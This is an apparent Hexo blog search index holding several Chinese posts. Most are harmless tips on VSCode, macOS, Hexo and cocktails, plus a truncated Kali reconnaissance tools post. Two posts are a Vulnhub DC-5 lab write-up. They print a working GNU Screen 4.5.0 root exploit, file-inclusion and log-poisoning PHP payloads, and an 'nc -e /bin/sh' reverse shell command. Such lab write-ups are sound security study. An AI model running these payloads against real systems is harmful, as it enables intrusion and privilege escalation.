<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>VSCode中配置Go相关插件失败问题</title>
    <link href="/posts/3d084d62/"/>
    <url>/posts/3d084d62/</url>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>安装完VSCode的Go插件后，一般会提示安装一些提醒类的辅助插件。当在常规安装中经常失败。。</p><p>一部分工具是需要从 <a href="https://golang.org/x/tools">https://golang.org/x/tools</a> 上进行获取，然而，由于网络的原因，经常导致安装失败。</p><p>即使，当我们将科学上网配置为全局代理后，也是不能访问到工具的下载地址。</p><p>因为<strong>在直接打开VSCode时，其中的操作没有经过代理</strong>。</p><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>终端设置为系统代理后，通过终端打开VSCode再进行安装插件。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 地址端口等按照自己的配置进行调整# 终端代理没有写入配置文件的情况下，仅在当前环境生效(参考环境变量)export https_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:7890 http_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:7890 all_proxy&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:7890# 打开VSCode后，在控制台进行 go:install 安装插件code .&#x2F;</code></pre></div><blockquote><p>参考：</p><p><a href="https://monsoir.github.io/Notes/Go/vscode-go.html">https://monsoir.github.io/Notes/Go/vscode-go.html</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VSCode</tag>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub DC-5 渗透测试(2)</title>
    <link href="/posts/e6bc9214/"/>
    <url>/posts/e6bc9214/</url>
    
    <content type="html"><![CDATA[<blockquote><p><code>Vulnhub DC-5</code> GetShell后的提权</p></blockquote><h2 id="1-利用点查找"><a href="#1-利用点查找" class="headerlink" title="1. 利用点查找"></a>1. 利用点查找</h2><p>查找所有具有setuid的指令</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@dc-5:~&#x2F;html$ find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null&#x2F;bin&#x2F;su&#x2F;bin&#x2F;mount&#x2F;bin&#x2F;umount&#x2F;bin&#x2F;screen-4.5.0&#x2F;usr&#x2F;bin&#x2F;gpasswd&#x2F;usr&#x2F;bin&#x2F;procmail&#x2F;usr&#x2F;bin&#x2F;at&#x2F;usr&#x2F;bin&#x2F;passwd&#x2F;usr&#x2F;bin&#x2F;chfn&#x2F;usr&#x2F;bin&#x2F;newgrp&#x2F;usr&#x2F;bin&#x2F;chsh&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device&#x2F;usr&#x2F;sbin&#x2F;exim4&#x2F;sbin&#x2F;mount.nfs</code></pre></div><p>可以看到在可执行文件中有个显著的程序<code>screen-4.5.0</code>。</p><p>通过<code>searchsploit</code>查找<code>screen 4.5</code>的可利用漏洞。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; searchsploit screen 4.5--------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                   |  Path--------------------------------------------------------------------------------- ---------------------------------GNU Screen 4.5.0 - Local Privilege Escalation                                    | linux&#x2F;local&#x2F;41154.shGNU Screen 4.5.0 - Local Privilege Escalation (PoC)                              | linux&#x2F;local&#x2F;41152.txt--------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results</code></pre></div><p>主要关注<code>/usr/share/exploitdb/exploits/linux/local/41154.sh</code>文件，可以看到直接给出了利用方式。</p><p>同时给出了<a href="https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html">bug</a>介绍，简要看了一下主要是<strong>利用程序的check以root权限打开日志文件</strong>。这使得我们可以截断任何文件或创建一个具有任何目录中的任何内容的root文件，并且可以通过这种方式轻松地获取root权限。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;41154.sh&#x2F;41154.sh#!&#x2F;bin&#x2F;bash# screenroot.sh# setuid screen v4.5.0 local root exploit# abuses ld.so.preload overwriting to get root.# bug: https:&#x2F;&#x2F;lists.gnu.org&#x2F;archive&#x2F;html&#x2F;screen-devel&#x2F;2017-01&#x2F;msg00025.html# HACK THE PLANET# ~ infodox (25&#x2F;1&#x2F;2017)echo &quot;~ gnu&#x2F;screenroot ~&quot;echo &quot;[+] First, we create our shell and library...&quot;cat &lt;&lt; EOF &gt; &#x2F;tmp&#x2F;libhax.c#include &lt;stdio.h&gt;ls#include &lt;sys&#x2F;types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void)&#123;    chown(&quot;&#x2F;tmp&#x2F;rootshell&quot;, 0, 0);    chmod(&quot;&#x2F;tmp&#x2F;rootshell&quot;, 04755);    unlink(&quot;&#x2F;etc&#x2F;ld.so.preload&quot;);    printf(&quot;[+] done!\n&quot;);&#125;EOFgcc -fPIC -shared -ldl -o &#x2F;tmp&#x2F;libhax.so &#x2F;tmp&#x2F;libhax.crm -f &#x2F;tmp&#x2F;libhax.ccat &lt;&lt; EOF &gt; &#x2F;tmp&#x2F;rootshell.c#include &lt;stdio.h&gt;int main(void)&#123;    setuid(0);    setgid(0);    seteuid(0);    setegid(0);    execvp(&quot;&#x2F;bin&#x2F;sh&quot;, NULL, NULL);&#125;EOFgcc -o &#x2F;tmp&#x2F;rootshell &#x2F;tmp&#x2F;rootshell.crm -f &#x2F;tmp&#x2F;rootshell.cecho &quot;[+] Now we create our &#x2F;etc&#x2F;ld.so.preload file...&quot;cd &#x2F;etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  &quot;\x0a&#x2F;tmp&#x2F;libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so...&#x2F;tmp&#x2F;rootshell</code></pre></div><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><p>上述<code>41154.sh</code>本来应该直接具有可执行性。但是上传到被攻击服务器上时，执行有错误。</p><p>对脚本稍作整理之后执行。执行过程并不复杂。</p><p><strong>将第一部分代码存于<code>/tmp/libhax.c</code>编译为<code>/tmp/libhax.so</code>。</strong></p><p><strong>内容主要是为了赋予<code>rootshell</code>可执行文件权限。</strong></p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;sys&#x2F;types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void)&#123;    chown(&quot;&#x2F;tmp&#x2F;rootshell&quot;, 0, 0);    chmod(&quot;&#x2F;tmp&#x2F;rootshell&quot;, 04755);    unlink(&quot;&#x2F;etc&#x2F;ld.so.preload&quot;);    printf(&quot;[+] done!\n&quot;);&#125;</code></pre></div><p><strong>将第二部分代码存于<code>/tmp/rootshell.c</code>编译为<code>/tmp/rootshell</code>。</strong></p><p><strong>内容主要是设置<code>setuid</code>等权限，提权后运行<code>sh</code>。</strong></p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;int main(void)&#123;    setuid(0);    setgid(0);    seteuid(0);    setegid(0);    execvp(&quot;&#x2F;bin&#x2F;sh&quot;, NULL, NULL);&#125;</code></pre></div><p><strong>第三部分执行代码，可保存为shell脚本等待使用<code>poc.sh</code>。</strong></p><p><strong>内容主要是讲第一部分的提升<code>rootshell</code>权限的部分写入<code>/etc</code>的某个文件中，并引起执行。</strong></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">echo &quot;[+] Now we create our &#x2F;etc&#x2F;ld.so.preload file...&quot;cd &#x2F;etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  &quot;\x0a&#x2F;tmp&#x2F;libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so...&#x2F;tmp&#x2F;rootshell</code></pre></div><p><strong>将整理好的<code>libhax.so</code>、<code>rootshell</code>、<code>poc.sh</code>上传到靶机的<code>/tmp</code>下。赋予<code>poc.sh</code>权限，执行后看到提权成功。</strong></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@dc-5:~&#x2F;html$ cd &#x2F;tmpwww-data@dc-5:&#x2F;tmp$ lsdc5.shlibhax.so  rootshellwww-data@dc-5:&#x2F;tmp$ chmod +x poc.shwww-data@dc-5:&#x2F;tmp$ .&#x2F;poc.sh[+] Now we create our &#x2F;etc&#x2F;ld.so.preload file...[+] Triggering...&#39; from &#x2F;etc&#x2F;ld.so.preload cannot be preloaded (cannot open shared object file): ignored.[+] done!No Sockets found in &#x2F;tmp&#x2F;screens&#x2F;S-www-data.# whoamiroot# cd &#x2F;root# lsthisistheflag.txt#</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>Vulnhub</tag>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub DC-5 渗透测试(1)</title>
    <link href="/posts/cd91c1d7/"/>
    <url>/posts/cd91c1d7/</url>
    
    <content type="html"><![CDATA[<blockquote><p>进行了一次Vulnhub DC-5 渗透测试，内容较为简单，主要练习相关环境的建立与测试流程。</p><p>靶机：<a href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a></p></blockquote><h2 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1. 主机发现"></a>1. 主机发现</h2><p>利用<code>netdiscover</code>发现主机，<code>192.168.203.130</code></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ netdiscoverCurrently scanning: 192.168.234.0&#x2F;16   |   Screen View: Unique Hosts2 Captured ARP Req&#x2F;Rep packets, from 2 hosts.   Total size: 120_____________________________________________________________________________  IP            At MAC Address     Count     Len  MAC Vendor &#x2F; Hostname-----------------------------------------------------------------------------192.168.205.1   e2:b5:5f:2f:91:64      1      60  Unknown vendor192.168.205.7   00:0c:29:63:68:89      1      60  VMware, Inc.</code></pre></div><p>或者使用<code>nmap -sP 192.168.205.0/24</code></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; nmap -sP 192.168.205.0&#x2F;24Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-04-11 15:48 CSTNmap scan report for 192.168.205.1Host is up (0.00036s latency).MAC Address: E2:B5:5F:2F:91:64 (Unknown)Nmap scan report for 192.168.205.7Host is up (0.0012s latency).MAC Address: 00:0C:29:63:68:89 (VMware)Nmap scan report for 192.168.205.4Host is up.Nmap done: 256 IP addresses (3 hosts up) scanned in 2.08 seconds</code></pre></div><h2 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2. 端口扫描"></a>2. 端口扫描</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; nmap -sV -A 192.168.205.7Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-04-11 15:37 CSTNmap scan report for 192.168.205.7Host is up (0.00093s latency).Not shown: 998 closed portsPORT    STATE SERVICE VERSION80&#x2F;tcp  open  http    nginx 1.6.2|_http-server-header: nginx&#x2F;1.6.2|_http-title: Welcome111&#x2F;tcp open  rpcbind 2-4 (RPC #100000)| rpcinfo:|   program version    port&#x2F;proto  service|   100000  2,3,4        111&#x2F;tcp   rpcbind|   100000  2,3,4        111&#x2F;udp   rpcbind|   100000  3,4          111&#x2F;tcp6  rpcbind|   100000  3,4          111&#x2F;udp6  rpcbind|   100024  1          43447&#x2F;tcp   status|   100024  1          46548&#x2F;udp6  status|   100024  1          53003&#x2F;udp   status|_  100024  1          60147&#x2F;tcp6  statusMAC Address: 00:0C:29:63:68:89 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopTRACEROUTEHOP RTT     ADDRESS1   0.93 ms 192.168.205.7OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 8.11 seconds</code></pre></div><h2 id="3-入侵点测试"><a href="#3-入侵点测试" class="headerlink" title="3. 入侵点测试"></a>3. 入侵点测试</h2><p>可以看到主要可利用端口为<code>80</code>。</p><p>查看了Web页面，没有什么CMS，只有几个标题页脚和几个页面。</p><p>其中<code>Home</code>、<code>Solutions</code>、<code>About Us</code>、<code>FAQ</code>都是一些文字没有利用空间。</p><p>在<code>Contact</code>页面中有表单提交，进行尝试分析。</p><p><img src="/image/Vulnhub-DC-5-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-1/contact.png" alt="contact"></p><p>在提交了几次表单后，发现<strong>页脚的年份在不断变化</strong>。</p><p>可能是引入了<code>footer.php</code>来输出页脚信息。</p><p><img src="/image/Vulnhub-DC-5-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-1/footer.png" alt="footer"></p><h3 id="3-1-文件包含漏洞"><a href="#3-1-文件包含漏洞" class="headerlink" title="3.1 文件包含漏洞"></a>3.1 文件包含漏洞</h3><p>因为页脚信息可能是通过包含<code>footer.php</code>进行输出的，所以可能存在文件包含漏洞，这里简单读一下系统目录发现直接就能读：<code>http://192.168.205.7/thankyou.php?file=/etc/passwd</code></p><p>说明此处存在<strong>文件包含漏洞</strong>。</p><p><img src="/image/Vulnhub-DC-5-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-1/file_include.png" alt="file_include"></p><p>同样可以使用伪协议来读取<code>thankyou.php</code>源码：<code>http://192.168.205.7/thankyou.php?file=php://filter/read=convert.base64-encode/resource=thankyou.php</code></p><p><img src="/image/Vulnhub-DC-5-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-1/read_resource.png" alt="read_resource"></p><p>解码可以看到确实是通过包含<code>footer.php</code>用以输出页脚信息。</p><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">···&lt;footer&gt;&lt;?php$file &#x3D; $_GET[&#39;file&#39;];if(isset($file))&#123;include(&quot;$file&quot;);&#125;else&#123;include(&quot;footer.php&quot;);&#125;?&gt;&lt;&#x2F;footer&gt;···</code></pre></div><p>顺便看一下<code>footer.php</code>内容。</p><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F;Random Gen Test$rndmYears &#x3D; array(    &quot;Copyright © 2017&quot;,     &quot;Copyright © 2018&quot;,     &quot;Copyright © 2019&quot;,     &quot;Copyright © 2020&quot;);echo $rndmYears[mt_rand(0, count($rndmYears)-1)];?&gt;</code></pre></div><h3 id="3-2-Nginx日志"><a href="#3-2-Nginx日志" class="headerlink" title="3.2 Nginx日志"></a>3.2 <code>Nginx</code>日志</h3><p>可以看到Web服务器使用了<code>Nginx</code>服务器，可以探测是否具有<code>Nginx</code>日志利用的可能。</p><p><img src="/image/Vulnhub-DC-5-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-1/wappalyzer.png" alt="wappalyzer"></p><p>查看<code>Nginx</code>配置文件：<code>http://192.168.205.7/thankyou.php?file=/etc/nginx/nginx.conf</code></p><p><img src="/image/Vulnhub-DC-5-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-1/file_conf.png" alt="file_conf"></p><p>可以看到log存放的目录：</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log;error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log;</code></pre></div><p>之后发包测试带入<code>&lt;?php phpinfo();?&gt;</code>看是否执行。</p><p><img src="/image/Vulnhub-DC-5-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-1/cmd_phpinfo.png" alt="cmd_phpinfo"></p><p>之后验证读取日志文件：<code>http://192.168.205.7/thankyou.php?file=/var/log/nginx/error.log</code></p><p><img src="/image/Vulnhub-DC-5-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-1/phpinfo.png" alt="phpinfo"></p><p>发现成功显示，说明Nginx日志写入命令成功执行。</p><h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h2><p>之后结合本地文件包含与Nginx日志进行Getshell。</p><p>传入一句话<code>http://192.168.205.7/thankyou.php?file=&lt;?php system($_REQUEST[&#39;cmd&#39;]);?&gt;</code></p><p><img src="//image/Vulnhub-DC-5-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-1/send_cmd.png" alt="send_cmd"></p><p>可以看到成功读取内容：<code>http://192.168.205.7/thankyou.php？file=/var/log/nginx/error.log&amp;cmd=ls</code></p><p><img src="/image/Vulnhub-DC-5-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-1/cmd_ls" alt="cmd_ls"></p><p>反弹shell：<code>/thankyou.php?file=/var/log/nginx/error.log&amp;cmd=nc -e /bin/sh 192.168.205.4 4444</code></p><p><img src="/image/Vulnhub-DC-5-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-1/cmd_nc.png" alt="cmd_nc"></p><p>nc连接，反弹成功。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; nc -lvp 4444listening on [any] 4444 ...192.168.205.7: inverse host lookup failed: Unknown hostconnect to [192.168.205.4] from (UNKNOWN) [192.168.205.7] 57668lsabout-us.phpcontact.phpcssfaq.phpfooter.phpimagesindex.phpsolutions.phpthankyou.php</code></pre></div><p>切换为交互式<code>bash</code>：<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">···solutions.phpthankyou.phppython -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;www-data@dc-5:~&#x2F;html$ lslsabout-us.php  css      footer.php  index.php  thankyou.phpcontact.php   faq.php  images   solutions.phpwww-data@dc-5:~&#x2F;html$</code></pre></div><p>之后为提权内容参见*Vulnhub DC-5 渗透测试(2)*。</p>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>Vulnhub</tag>
      
      <tag>文件包含</tag>
      
      <tag>Nginx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mac删除Launchpad残留图标</title>
    <link href="/posts/98807702/"/>
    <url>/posts/98807702/</url>
    
    <content type="html"><![CDATA[<p>在<code>finder</code>中前往<code>/private/var/folders</code>。</p><p>在<code>folders</code>中搜索<code>com.apple.dock.launchpad</code>。</p><p>在<code>终端</code>进入<code>com.apple.dock.launchpad/db</code>目录</p><p>执行以下命令，<code>What you want del</code>为你想要清除的残留图标名。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlite3 db &quot;delete from apps where title&#x3D;&#39;What you want del&#39;;&quot;&amp;&amp;killall Dock</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MacOS</tag>
      
      <tag>Launchpad</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo链接优化:abbrlink</title>
    <link href="/posts/6e344d64/"/>
    <url>/posts/6e344d64/</url>
    
    <content type="html"><![CDATA[<blockquote><p><code>Hexo</code>博客的链接如果显示中文，在一些场景的超链接识别可能不完全，如果使用转码则中文转码较长较乱。</p><p>这里使用<a href="https://github.com/rozbo/hexo-abbrlink">hexo-abbrlink</a>插件进行优化链接。</p></blockquote><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npm install hexo-abbrlink --save</code></pre></div><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>修改博客配置文件<code>_config.yml</code>内容</p><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">permalink: posts&#x2F;:abbrlink&#x2F;## abbrlink confabbrlink:  alg: crc32  # 算法：crc16(default) and crc32  rep: hex    # 进制：dec(default) and hex</code></pre></div><p>之后<code>md</code>文件的<code>Front-matter</code> 内会增加<code>abbrlink</code> 字段。无需操作。</p><blockquote><p>参考：</p><p><a href="https://github.com/rozbo/hexo-abbrlink">https://github.com/rozbo/hexo-abbrlink</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blog</tag>
      
      <tag>Hexo</tag>
      
      <tag>abbrlink</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cocktail Formulas</title>
    <link href="/posts/56b5b661/"/>
    <url>/posts/56b5b661/</url>
    
    <content type="html"><![CDATA[<blockquote><p>《鸡尾酒法典》将所有Cocktail分为6种基本框架</p></blockquote><h3 id="Old-fashioned古典——烈酒-糖-苦精"><a href="#Old-fashioned古典——烈酒-糖-苦精" class="headerlink" title="Old fashioned古典——烈酒+糖+苦精"></a><code>Old fashioned古典</code>——烈酒+糖+苦精</h3><blockquote><p>甜+苦</p></blockquote><p>例：</p><ul><li><p>各种基底（威士忌、干邑、白酒等等）的old fashioned</p></li><li><p>萨泽拉克sazerac——黑麦威士忌+方糖+苦精+苦艾酒或Herbsaint</p></li><li><p>薄荷茱莉普Julep——威士忌、</p></li></ul><h3 id="Highball——烈酒-两份长饮成分"><a href="#Highball——烈酒-两份长饮成分" class="headerlink" title="Highball——烈酒+两份长饮成分"></a><code>Highball</code>——烈酒+两份长饮成分</h3><blockquote><p>简单易饮</p></blockquote><p>例：</p><p>金汤力——金酒+汤力水</p><p>帕洛玛Paloma——龙舌兰+西柚汁+西柚汤力</p><p>自由古巴——朗姆酒+可乐</p><p>大多数便利店调酒</p><h3 id="Daiquiri大吉利——烈酒-柑橘酸-糖浆"><a href="#Daiquiri大吉利——烈酒-柑橘酸-糖浆" class="headerlink" title="Daiquiri大吉利——烈酒+柑橘酸+糖浆"></a><code>Daiquiri大吉利</code>——烈酒+柑橘酸+糖浆</h3><blockquote><p>酸＋甜结构。更改基酒核心即可</p></blockquote><p>例：</p><p>Gimlet——金酒+柠檬汁+单糖浆</p><p>威士忌酸——调和威士忌+柠檬汁+单糖浆</p><h3 id="Side-car边车——烈酒-柑橘酸-利口酒"><a href="#Side-car边车——烈酒-柑橘酸-利口酒" class="headerlink" title="Side car边车——烈酒+柑橘酸+利口酒"></a><code>Side car边车</code>——烈酒+柑橘酸+利口酒</h3><blockquote><p>酸＋甜结构。与Daiquiri不同的是，甜的部分由利口酒提供。两种都可称为酸酒</p></blockquote><p>例：</p><p>White lady——金酒+柠檬汁+君度橙酒</p><p>玛格丽特——龙舌兰+青柠汁+君度橙酒+细盐</p><h3 id="Martini马天尼——烈酒-加香葡萄酒"><a href="#Martini马天尼——烈酒-加香葡萄酒" class="headerlink" title="Martini马天尼——烈酒+加香葡萄酒"></a><code>Martini马天尼</code>——烈酒+加香葡萄酒</h3><blockquote><p>伏特加底或金酒底常见，葡萄突出</p></blockquote><p>例：</p><p>曼哈顿——波本+甜味美思</p><p>Rob roy罗布罗伊——苏格兰威士忌+甜味美思+苦精 1滴</p><h3 id="Flip——烈酒-蛋-奶-糖"><a href="#Flip——烈酒-蛋-奶-糖" class="headerlink" title="Flip——烈酒+蛋/奶+糖"></a><code>Flip</code>——烈酒+蛋/奶+糖</h3><blockquote><p>蛋/奶比较突出</p></blockquote><p>例：</p><p>亚历山大——白兰地+淡奶油+利口酒+豆蔻粉</p><p>白俄罗斯——伏特加+奶油+咖啡糖浆</p><blockquote><p>参考：</p><p><a href="https://www.bilibili.com/video/BV1uB4y1P7P1">https://www.bilibili.com/video/BV1uB4y1P7P1</a></p><p><a href="https://book.douban.com/subject/35197564/">《 鸡尾酒法典》</a>作者: 〔美〕亚历克斯·戴 / 〔美〕尼克·福查德 / 〔美〕大卫·卡普兰</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cocktail</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kali信息收集工具</title>
    <link href="/posts/d163314c/"/>
    <url>/posts/d163314c/</url>
    
    <content type="html"><![CDATA[<h2 id="1-DNS枚举"><a href="#1-DNS枚举" class="headerlink" title="1. DNS枚举"></a>1. DNS枚举</h2><h3 id="1-1-DNSenum"><a href="#1-1-DNSenum" class="headerlink" title="1.1 DNSenum"></a>1.1 <code>DNSenum</code></h3><p><code>DNSenum</code>是一款非常强大的<strong>域名信息收集工具</strong>。它能够通过谷歌或者字典文件猜测可能存在的域名，并对一个网段进行反向查询。它不仅可以查询网站的主机地址信息、域名服务器和邮件交换记录，还可以在域名服务器上执行<code>axfr</code>请求，然后通过谷歌脚本得到扩展域名信息，提取子域名并查询，最后计算C类地址并执行<code>whois</code>查询，执行反向查询，把地址段写入文件。</p><ul><li><code>--threads [number]</code>：设置用户同时运行多个进程数。</li><li><code>-r</code>：允许用户启用递归查询。</li><li><code>-d</code>：允许用户设置WHOIS请求之间时间延迟数（单位为秒）。</li><li><code>-o</code>：允许用户指定输出位置。</li><li><code>-w</code>：允许用户启用WHOIS请求。</li></ul><p>示例：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; dnsenum -f &#x2F;usr&#x2F;share&#x2F;dnsenum&#x2F;dns.txt hust.edu.cndnsenum VERSION:1.2.6-----   hust.edu.cn   -----Host&#39;s addresses:__________________hust.edu.cn.                             4502     IN    A        202.114.0.245Name Servers:______________dns1.hust.edu.cn.                        4502     IN    A        202.114.0.120dns2.hust.edu.cn.                        4502     IN    A        59.172.234.181······Brute forcing with &#x2F;usr&#x2F;share&#x2F;dnsenum&#x2F;dns.txt:_______________________________________________access.hust.edu.cn.                      4502     IN    A        210.42.109.207aco.hust.edu.cn.                         4502     IN    CNAME    zhanqun5.hust.edu.cn.zhanqun5.hust.edu.cn.                    4502     IN    A        210.42.108.5blog.hust.edu.cn.                        4502     IN    A        202.114.18.177······</code></pre></div><h3 id="1-2-fierce"><a href="#1-2-fierce" class="headerlink" title="1.2 fierce"></a>1.2 <code>fierce</code></h3><p><code>fierce</code>工具和<code>DNSenum</code>工具性质差不多，其<code>fierce</code>主要是<strong>对子域名进行扫描和收集信息</strong>的。使用<code>fierce</code>工具获取一个目标主机上所有IP地址和主机信息。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; fierce --domain baidu.comNS: ns3.baidu.com. ns7.baidu.com. dns.baidu.com. ns4.baidu.com. ns2.baidu.com.SOA: dns.baidu.com. (110.242.68.134)······Nearby:&#123;&#39;111.202.115.74&#39;: &#39;mx11.baidu.com.&#39;, &#39;111.202.115.75&#39;: &#39;mx10.baidu.com.&#39;&#125;Found: cache.baidu.com. (110.242.68.227)Found: cafe.baidu.com. (123.125.115.189)Found: cc.baidu.com. (112.34.111.153)Found: cdn.baidu.com. (10.169.43.10)······</code></pre></div><h3 id="1-3-Sublist3r"><a href="#1-3-Sublist3r" class="headerlink" title="1.3 Sublist3r"></a>1.3 <code>Sublist3r</code></h3><blockquote><p><a href="https://github.com/aboul3la/Sublist3r.git">https://github.com/aboul3la/Sublist3r.git</a></p></blockquote><p><code>Sublist3r</code>是一个<code>python</code>工具，旨在使用<code>OSINT</code><strong>枚举网站的子域</strong>。<code>Sublist3r</code>使用Google、Yahoo、Bing、百度和Ask等许多搜索引擎枚举子域。<code>Sublist3r</code>还使用Netcraft、Virustotal、ThreatCrowd、DNSdumpster和ReverseDNS来枚举子域名。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; python sublist3r.py -d hust.edu.cn                 ____        _     _ _     _   _____                &#x2F; ___| _   _| |__ | (_)___| |_|___ &#x2F; _ __                \___ \| | | | &#39;_ \| | &#x2F; __| __| |_ \| &#39;__|                 ___) | |_| | |_) | | \__ \ |_ ___) | |                |____&#x2F; \__,_|_.__&#x2F;|_|_|___&#x2F;\__|____&#x2F;|_|                # Coded By Ahmed Aboul-Ela - @aboul3la[-] Enumerating subdomains now for hust.edu.cn[-] Searching now in Baidu..[-] Searching now in Yahoo..[-] Searching now in Google..[-] Searching now in Bing..[-] Searching now in Ask..[-] Searching now in Netcraft..[-] Searching now in DNSdumpster..[-] Searching now in Virustotal..[-] Searching now in ThreatCrowd..[-] Searching now in SSL Certificates..[-] Searching now in PassiveDNS..[!] Error: Virustotal probably now is blocking our requests[-] Total Unique Subdomains Found: 150www.hust.edu.cnadmission.hust.edu.cnadvise.hust.edu.cnbcf.hust.edu.cnbiophy.hust.edu.cnblog.hust.edu.cnbyhh.hust.edu.cn······</code></pre></div><h2 id="2-测试网络范围"><a 